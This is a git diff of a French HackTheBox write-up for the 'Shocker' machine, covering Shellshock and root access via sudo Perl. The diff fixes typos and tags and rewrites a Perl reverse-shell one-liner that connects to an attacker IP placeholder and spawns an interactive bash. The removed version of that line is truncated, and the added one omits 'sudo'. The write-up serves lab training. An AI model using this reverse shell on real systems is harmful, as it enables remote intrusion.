@@ -13,7 +13,7 @@ draft: false
 type: "writeups"
 summary: "CGI vulnérable, exploitation de Shellshock et escalade de privilèges jusqu’au root via sudo Perl."
 description: "Writeup de Shocker (HTB Easy) : walkthrough pas à pas avec identification d’un CGI vulnérable, exploitation de Shellshock et accès root obtenu étape après étape."
-tags: ["Easy","Shellshock","Perl","Linux"]
+tags: ["HTB-Easy","Shellshock","Perl","Linux"]
 categories: ["Mes writeups"]
 
 # --- TOC & mise en page ---
@@ -118,7 +118,7 @@ mon-nmap shocker.htb
 
 Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) te révèle les ports ouverts suivants :
 
-> Note : les IP et timestamps peuvent varier selon les resets HTB ; l’important ici est la surface exposée (TApache, CGI et SSH).
+> Note : les IP et timestamps peuvent varier selon les resets HTB ; l’important ici est la surface exposée (Apache, CGI et SSH).
 
 ```txt
 # Nmap 7.95 scan initiated Fri Nov 21 16:15:03 2025 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt shocker.htb
@@ -258,7 +258,7 @@ PORT      STATE         SERVICE
 Pour la partie découverte de chemins web, utilise le script dédié {{< script "mon-recoweb" >}}
 
 ```bash
-mon-recoweb shocket.htb
+mon-recoweb shocker.htb
 
 # Résultats dans le répertoire scans_recoweb/
 #  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
@@ -626,7 +626,7 @@ Puisque l’utilisateur `shelly` est autorisé à exécuter des commandes **Perl
 Pour cela, tu utilises un **payload Bash encapsulé en Perl**, par exemple généré depuis [revshells.com](https://www.revshells.com/), et l’exécutes via `sudo perl`. Cette technique te permet d’obtenir un shell avec les droits root de manière directe et contrôlée.
 
 ```bash
-shelly@Shocker:/home/shelly$ sudo perl -e 'use Socket;$i="10.10.14.xx";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotob;if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+shelly@Shocker:/home/shelly$perl -e 'use Socket;$i="10.10.x.x";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
 ```
 
 ### Root Shell dans Kali Linux
